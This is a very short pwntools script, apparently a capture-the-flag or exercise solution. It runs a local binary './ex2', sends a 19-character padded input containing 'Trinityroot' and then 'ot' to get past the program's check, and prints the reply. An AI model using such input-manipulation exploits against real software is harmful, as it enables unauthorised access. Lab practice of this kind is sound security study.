from pwn import *

io = process('./ex2')

io.sendline('{:19}'.format(' Trinityroot'))
io.sendline('ot')

print io.recv()

